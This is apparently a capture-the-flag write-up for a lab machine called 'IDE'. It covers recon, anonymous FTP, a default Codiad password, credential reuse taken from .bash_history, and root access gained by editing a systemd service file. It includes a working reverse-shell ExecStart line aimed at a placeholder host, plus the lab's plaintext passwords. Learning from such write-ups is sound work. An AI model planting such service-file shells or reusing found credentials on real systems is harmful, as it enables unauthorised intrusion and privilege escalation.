# IDE
### Users
```
john
drac
```
### Credentials
```
Codiad Web app:
john:password

System:
drac:Th3dRaCULa1sR3aL
/home/drac/.bash_history:mysql -u drac -p 'Th3dRaCULa1sR3aL' --> From .bash_history
- Credentials reused for system user
```
## Recon
### Nmap Scan
```
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.21.105.103
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e2:be:d3:3c:e8:76:81:ef:47:7e:d0:43:d4:28:14:28 (RSA)
|   256 a8:82:e9:61:e4:bb:61:af:9f:3a:19:3b:64:bc:de:87 (ECDSA)
|_  256 24:46:75:a7:63:39:b6:3c:e9:f1:fc:a4:13:51:63:20 (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
62337/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Codiad 2.8.4
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
**Quick Look:**
FTP:
* Anonymous login allowed

HTTP:
* Apache default page

HTTP 62337:
* Codiad 2.8.4
### Web Recon
**Port 62337**
Service running on port 62337 was vulnerable to an Authenticated Remote Code Execution vulnerability which I was able 
to leverage in my favour to get a reverse shell into the machine.
https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit --> More Here

## Foothold / Privilege Escalation
The server had an FTP service running and I was able to login using anonymous credentials.
Inside the developers tried to hide a file under the “…” directory and called it “-”. So when I downloaded and changed the name to message, it read a message from the admins about the credentials for the user john. It stated the password was reset to the default password which was very easily guessable since it was “password”. The credentials in question were for the service running on port 62337 which was Codiad v2.8.4, this version was vulnerable to an Authenticated Remote Command Execution vulnerability.
The exploit is related to how Codiad processes file uploads and the lack of proper input validation. The core of the issue is the unsafe inclusion of user-provided files.
I used the Codiad RCE exploit to get an initial foothold in the machine.
### Privilege Escalation
Looking through the machine I found another user drac, and in his home directory he did not clean up his .bash_history file so I was able to read through it and found a MySQL database password with his username.
I tested for credential reusage and was successful, I now have a real user compromised.\
**Privilege Escalation via .service files**\
As the user drac I had sudo permissions on the vsftpd service, more importantly I could restart it with sudo.
So with this information I could try and change the vsftpd.service file to execute a reverse shell when I restart it.
```
[Unit]
Description=vsftpd FTP server
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/<LISTENER_PORT 0>&1'
ExecReload=/bin/kill -HUP $MAINPD
ExecStartPre=-/bin/mkdir -p /var/run/vsftp/empty

[Install]
WantedBy=multi-user.target
```
If you restart it now you will get an error, but just execute what the error tells you and restart vsftpd again but don't forget to setup your listener otherwise the shell won't work and you get root.
## Notes
**Privilege Escalation via editing .service files**\
Using .service files an attacker if they have permissions, modify files and execute unwanted commands. Like in this case I modified the vsftpd.service file in a way that when the ftp service starts it will give my current user sudo permissions for the whole system. So I could just sudo su and get root.
